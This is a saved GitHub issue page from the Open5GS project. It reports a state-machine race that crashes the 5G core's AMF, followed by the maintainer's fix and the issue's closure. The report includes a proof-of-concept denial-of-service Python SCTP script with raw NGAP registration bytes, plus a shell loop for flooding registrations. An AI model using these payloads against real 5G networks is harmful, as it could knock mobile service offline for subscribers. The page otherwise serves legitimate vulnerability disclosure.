=== Content from github.com_fb0f1ebe_20250110_114900.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen5gs%2Fopen5gs%2Fissues%2F2733)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen5gs%2Fopen5gs%2Fissues%2F2733)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=open5gs%2Fopen5gs)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[open5gs](/open5gs)
/
**[open5gs](/open5gs/open5gs)**
Public

* [Notifications](/login?return_to=%2Fopen5gs%2Fopen5gs) You must be signed in to change notification settings
* [Fork
  783](/login?return_to=%2Fopen5gs%2Fopen5gs)
* [Star
   1.9k](/login?return_to=%2Fopen5gs%2Fopen5gs)

* [Code](/open5gs/open5gs)
* [Issues
  149](/open5gs/open5gs/issues)
* [Pull requests
  55](/open5gs/open5gs/pulls)
* [Discussions](/open5gs/open5gs/discussions)
* [Actions](/open5gs/open5gs/actions)
* [Projects
  0](/open5gs/open5gs/projects)
* [Wiki](/open5gs/open5gs/wiki)
* [Security](/open5gs/open5gs/security)
* [Insights](/open5gs/open5gs/pulse)

Additional navigation options

* [Code](/open5gs/open5gs)
* [Issues](/open5gs/open5gs/issues)
* [Pull requests](/open5gs/open5gs/pulls)
* [Discussions](/open5gs/open5gs/discussions)
* [Actions](/open5gs/open5gs/actions)
* [Projects](/open5gs/open5gs/projects)
* [Wiki](/open5gs/open5gs/wiki)
* [Security](/open5gs/open5gs/security)
* [Insights](/open5gs/open5gs/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fopen5gs%2Fopen5gs%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fopen5gs%2Fopen5gs%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# [Bug]: InitialUEMessage, Registration request sent at a specific time can crash AMF due to incorrect error handling in the gmm state machine #2733

Closed

[liuxiaoxinxinxin](/liuxiaoxinxinxin) opened this issue
Nov 13, 2023
· 3 comments

Closed

# [[Bug]: InitialUEMessage, Registration request sent at a specific time can crash AMF due to incorrect error handling in the gmm state machine](#top) #2733

[liuxiaoxinxinxin](/liuxiaoxinxinxin) opened this issue
Nov 13, 2023
· 3 comments

Labels
[Housekeeping:ToClose](/open5gs/open5gs/labels/Housekeeping%3AToClose)
Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request
[type:bug](/open5gs/open5gs/labels/type%3Abug)
Open5GS bug

## Comments

[![@liuxiaoxinxinxin](https://avatars.githubusercontent.com/u/103559845?s=80&v=4)](/liuxiaoxinxinxin)

Copy link

Contributor

### **[liuxiaoxinxinxin](/liuxiaoxinxinxin)** commented [Nov 13, 2023](#issue-1990113647) • edited Loading

| Open5GS Release, Revision, or Tag v2.6.6 Steps to reproduceBug Description According to page 143 of 3GPP TS 23.502 V18.3.0 (2023-09), in steps 14a-c of the User Equipment (UE) registration process, if the UE's registration type is initial registration or emergency registration, the AMF will send a Nudm\_UECM\_Registration request to the UDM, as shown in the figure below, notifying the UDM of a new UE wishing to register. Upon receipt of the Nudm\_UECM\_Registration request, if the registration request is valid, the UDM will send a verification and authentication response message to the AMF, confirming the identity of the UE and the validity of the registration request.  In the previous UE registration process, if the same UE sends a registration request again, the AMF will release the new or previous UE context depending on the situation. Before the response message from the UDM mentioned above arrives at the AMF, the previous UE context may be released, and the new registration process enters the AKA authentication process. At this point, the AMF will receive and process the response message from the UDM for the previous registration process, which will lead to incorrect states in the gmm state machine operation, thus causing the AMF to crash. [crash reason](https://private-user-images.githubusercontent.com/103559845/282400995-24ee7743-95da-4d12-8b19-d21a460af458.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MTAwNDAsIm5iZiI6MTczNjUwOTc0MCwicGF0aCI6Ii8xMDM1NTk4NDUvMjgyNDAwOTk1LTI0ZWU3NzQzLTk1ZGEtNGQxMi04YjE5LWQyMWE0NjBhZjQ1OC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMFQxMTQ5MDBaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT05MmY2MjQyYjU0N2JkYzNjYTEyZGNhMjNhYTMzMWIzMmVmMTM5ZjQ0MDg5YWE4MWYxYmMxNGQ2NzZiZTBmNTEyJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.EMNg5VAAJmI1DbU_FyaY7bjWI_nXTiQOg6ZJlkOYQT8) Steps to reproduce： Please set up the environment following the instructions at [https://github.com/s5uishida/open5gs\_5gc\_ueransim\_sample\_config](url), we use just one UE and one UPF. We have two ways to cause AMF to crash:   1. If the same UE continuously sends registration requests via gNB, the AMF will receive and process a large number of these requests, which can easily create the situation described above. This method doesn't require additional code programming; just a few lines of script are needed to confirm the existence of the vulnerability.    Run the following script on the UE for about 10 minutes with the gNB turned off.  ``` #!/bin/bash while true;do         sudo ./nr-ue -c ../config/open5gs-ue0.yaml &         process_pid=$!         sleep 10         kill $process_pid         sleep 1 done ```  Then just turn on the gnb and observe the AMF   2. It is necessary to send a registration request to the AMF at a specific time to ensure the situation described above is achieved. A malicious adversary can cause the AMF to crash by registering their own gNB and sending registration messages from a UE with the same IMSI.  ``` import socket import sctp import time  sk = sctp.sctpsocket_tcp(socket.AF_INET) # set up socket with your ip sk.connect(("192.168.182.138", 38412))  # NGSetupRequest ngsetup_data = b"\x00\x15\x00\x3e\x00\x00\x04\x00\x1b\x00\x09\x00\x00\xf1\x10\x50" \                           b"\x00\x00\x00\x01\x00\x52\x40\x14\x08\x80\x55\x45\x52\x41\x4e\x53" \                           b"\x49\x4d\x2d\x67\x6e\x62\x2d\x31\x2d\x31\x2d\x31\x00\x66\x00\x0d" \                           b"\x00\x00\x00\x00\x01\x00\x00\xf1\x10\x00\x00\x00\x08\x00\x15\x40" \                           b"\x01\x40" sk.sendall(ngsetup_data) time.sleep(1)  # InitialUEMessage, Registration request ini_data = b"\x00\x0f\x40\x48\x00\x00\x05\x00\x55\x00\x02\x00\x01\x00\x26\x00" \                  b"\x1a\x19\x7e\x00\x41\x79\x00\x0d\x01\x00\xf1\x10\x00\x00\x00\x00" \                  b"\x00\x00\x00\x00\x00\x2e\x04\xf0\xf0\xf0\xf0\x00\x79\x00\x13\x50" \                  b"\x00\xf1\x10\x00\x00\x00\x01\x00\x00\xf1\x10\x00\x00\x01\xe8\xf7" \                  b"\x53\x4e\x00\x5a\x40\x01\x18\x00\x70\x40\x01\x00" sk.sendall(ini_data) time.sleep(10) sk.close() ```  The specific timing needs to be determined based on the particular environment. [log&pcap.zip](https://github.com/open5gs/open5gs/files/13332215/log.pcap.zip) Logs ``` Below are some logs from version v2.6.6.  When receiving nudm response during the gmm_state_authentication(), AMF crashed. 11/06 16:04:24.027: [sbi] DEBUG: [200:PUT] http://127.0.1.10:7777/nudm-uecm/v1/imsi-001010000000000/registrations/amf-3gpp-access (../lib/sbi/client.c:604) 11/06 16:04:24.027: [sbi] DEBUG: RECEIVED[297] (../lib/sbi/client.c:615) 11/06 16:04:24.027: [sbi] DEBUG: {         "amfInstanceId":        "30cde486-7c7a-41ee-bd71-310a68b7fc8c",         "pei":  "imeisv-4370816125816151",         "deregCallbackUri":     "http://127.0.0.5:7777/namf-callback/v1/imsi-001010000000000/dereg-notify",         "guami":        {                 "plmnId":       {                         "mcc":  "001",                         "mnc":  "01"                 },                 "amfId":        "020040"         },         "ratType":      "NR" } (../lib/sbi/client.c:617) 11/06 16:04:24.028: [amf] DEBUG: amf_state_operational(): OGS_EVENT_NAME_SBI_CLIENT (../src/amf/amf-sm.c:78) {         "amfInstanceId":        "30cde486-7c7a-41ee-bd71-310a68b7fc8c",         "pei":  "imeisv-4370816125816151",         "deregCallbackUri":     "http://127.0.0.5:7777/namf-callback/v1/imsi-001010000000000/dereg-notify",         "guami":        {                 "plmnId":       {                         "mcc":  "001",                         "mnc":  "01"                 },                 "amfId":        "020040"         },         "ratType":      "NR" }11/06 16:04:24.028: [gmm] DEBUG: gmm_state_authentication(): OGS_EVENT_NAME_SBI_CLIENT (../src/amf/gmm-sm.c:1376) 11/06 16:04:24.028: [gmm] ERROR: Invalid service name [nudm-uecm] (../src/amf/gmm-sm.c:1608) 11/06 16:04:24.028: [gmm] FATAL: gmm_state_authentication: should not be reached. (../src/amf/gmm-sm.c:1609) 11/06 16:04:24.032: [core] FATAL: backtrace() returned 9 addresses (../lib/core/ogs-abort.c:37) /home/lxy/open5gs-main/install/bin/open5gs-amfd() [0x434602] /home/lxy/open5gs-main/install/lib/x86_64-linux-gnu/libogscore.so.2(ogs_fsm_dispatch+0x13b) [0x7ffff7f9d56b] /home/lxy/open5gs-main/install/bin/open5gs-amfd() [0x43a39d] /home/lxy/open5gs-main/install/lib/x86_64-linux-gnu/libogscore.so.2(ogs_fsm_dispatch+0x13b) [0x7ffff7f9d56b] /home/lxy/open5gs-main/install/bin/open5gs-amfd() [0x408134] /home/lxy/open5gs-main/install/lib/x86_64-linux-gnu/libogscore.so.2(+0x11cca) [0x7ffff7f8ccca] /lib/x86_64-linux-gnu/libpthread.so.0(+0x8609) [0x7ffff72f2609] /lib/x86_64-linux-gnu/libc.so.6(clone+0x43) [0x7ffff7217133]  The attached files contain logs from version v2.6.4 along with the corresponding packet captures. ``` Expected behaviour Upon conducting a code audit, we think that the issue arises due to a lack of handling for the situation described above in the gmm\_state\_authentication function in /src/amf/gmm-sm.c. Adding appropriate handling might be a solution. Observed Behaviour AMF crashed when receiving nudm response in gmm\_state\_authentication eNodeB/gNodeB UERANSIM v3.2.6 UE Models and versions UERANSIM v3.2.6 |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@liuxiaoxinxinxin](https://avatars.githubusercontent.com/u/103559845?s=40&v=4)](/liuxiaoxinxinxin)
[liuxiaoxinxinxin](/liuxiaoxinxinxin)
added
the
[triage](/open5gs/open5gs/labels/triage)
Triage label for new issues and feature requests
label
[Nov 13, 2023](#event-10938385313)

[acetcom](/acetcom)
added a commit
that referenced
this issue
[Nov 25, 2023](#ref-commit-7278714)
[![@acetcom](https://avatars.githubusercontent.com/u/4222492?s=40&u=71a6e5e0382ff3d0e1191594f5fb838bfc2268bf&v=4)](/acetcom)

`[[AMF] Fixed Nudm_UECM_Registration crash (](/open5gs/open5gs/commit/7278714133422cee46c32c7523f81ec2cecad9e2 "[AMF] Fixed Nudm_UECM_Registration crash (#2733)

1. UE sends RegistrationRequest to AMF.
2. AMF sends Nudm_UECM_Registration to UDM.
3. UE sends RegistrationRequest to AMF.
4. GMM state is gmm_state_authentication
5. UDM sends Nudm_UECM_Registration response to AMF.
6. AMF crashs since no Handler in gmm_state_authentication state")[#2733](https://github.com/open5gs/open5gs/issues/2733)[)](/open5gs/open5gs/commit/7278714133422cee46c32c7523f81ec2cecad9e2 "[AMF] Fixed Nudm_UECM_Registration crash (#2733)

1. UE sends RegistrationRequest to AMF.
2. AMF sends Nudm_UECM_Registration to UDM.
3. UE sends RegistrationRequest to AMF.
4. GMM state is gmm_state_authentication
5. UDM sends Nudm_UECM_Registration response to AMF.
6. AMF crashs since no Handler in gmm_state_authentication state")`
…

`[7278714](/open5gs/open5gs/commit/7278714133422cee46c32c7523f81ec2cecad9e2)`

```
1. UE sends RegistrationRequest to AMF.
2. AMF sends Nudm_UECM_Registration to UDM.
3. UE sends RegistrationRequest to AMF.
4. GMM state is gmm_state_authentication
5. UDM sends Nudm_UECM_Registration response to AMF.
6. AMF crashs since no Handler in gmm_state_authentication state
```

[![@acetcom](https://avatars.githubusercontent.com/u/4222492?s=40&u=71a6e5e0382ff3d0e1191594f5fb838bfc2268bf&v=4)](/acetcom)
[acetcom](/acetcom)
added
[type:bug](/open5gs/open5gs/labels/type%3Abug)
Open5GS bug
and removed
[triage](/open5gs/open5gs/labels/triage)
Triage label for new issues and feature requests
labels
[Nov 25, 2023](#event-11060637675)

[![@acetcom](https://avatars.githubusercontent.com/u/4222492?s=80&u=71a6e5e0382ff3d0e1191594f5fb838bfc2268bf&v=4)](/acetcom)

Copy link

Member

### **[acetcom](/acetcom)** commented [Nov 25, 2023](#issuecomment-1826296546)

| [@liuxiaoxinxinxin](https://github.com/liuxiaoxinxinxin)  I've fixed it in the main branch.  Please let me know if you have any different issue.  Thanks a lot! Sukchan. |
| --- |

All reactions

Sorry, something went wrong.

[![@acetcom](https://avatars.githubusercontent.com/u/4222492?s=40&u=71a6e5e0382ff3d0e1191594f5fb838bfc2268bf&v=4)](/acetcom)
[acetcom](/acetcom)
added
the
[Housekeeping:ToClose](/open5gs/open5gs/labels/Housekeeping%3AToClose)
Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request
label
[Nov 25, 2023](#event-11060638448)

[![@liuxiaoxinxinxin](https://avatars.githubusercontent.com/u/103559845?s=80&v=4)](/liuxiaoxinxinxin)

Copy link

Contributor

Author

### **[liuxiaoxinxinxin](/liuxiaoxinxinxin)** commented [Nov 28, 2023](#issuecomment-1828930300)

| [@acetcom](https://github.com/acetcom) Thanks for your relpy and contribution! I don't meet the problem agan. |
| --- |

All reactions

Sorry, something went wrong.

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)](/apps/github-actions)
[github-actions](/apps/github-actions)
bot
removed
the
[Housekeeping:ToClose](/open5gs/open5gs/labels/Housekeeping%3AToClose)
Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request
label
[Nov 28, 2023](#event-11089473967)

[![@acetcom](https://avatars.githubusercontent.com/u/4222492?s=40&u=71a6e5e0382ff3d0e1191594f5fb838bfc2268bf&v=4)](/acetcom)
[acetcom](/acetcom)
added
the
[Housekeeping:ToClose](/open5gs/open5gs/labels/Housekeeping%3AToClose)
Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request
label
[Dec 4, 2023](#event-11139028259)

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=80&v=4)](/apps/github-actions)
[![GitHub Actions](https://avatars.githubusercontent.com/in/15368?s=40&u=167a342ed94d2a713daf64a8b476ead2cebe1852&v=4)](https://github.com/apps/github-actions)

Copy link

### **[github-actions](/apps/github-actions) bot** commented [Jan 3, 2024](#issuecomment-1876060200)

| This issue has been closed automatically due to lack of activity. This has been done to try and reduce the amount of noise. Please do not comment any further. The Open5GS Team may choose to re-open this issue if necessary. |
| --- |

All reactions

Sorry, something went wrong.

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)](/apps/github-actions)
[github-actions](/apps/github-actions)
bot
closed this as [completed](/open5gs/open5gs/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Jan 3, 2024](#event-11383717078)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen5gs%2Fopen5gs%2Fissues%2F2733)

Assignees

No one assigned

Labels

[Housekeeping:ToClose](/open5gs/open5gs/labels/Housekeeping%3AToClose)
Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request
[type:bug](/open5gs/open5gs/labels/type%3Abug)
Open5GS bug

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

2 participants

[![@acetcom](https://avatars.githubusercontent.com/u/4222492?s=52&v=4)](/acetcom) [![@liuxiaoxinxinxin](https://avatars.githubusercontent.com/u/103559845?s=52&v=4)](/liuxiaoxinxinxin)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


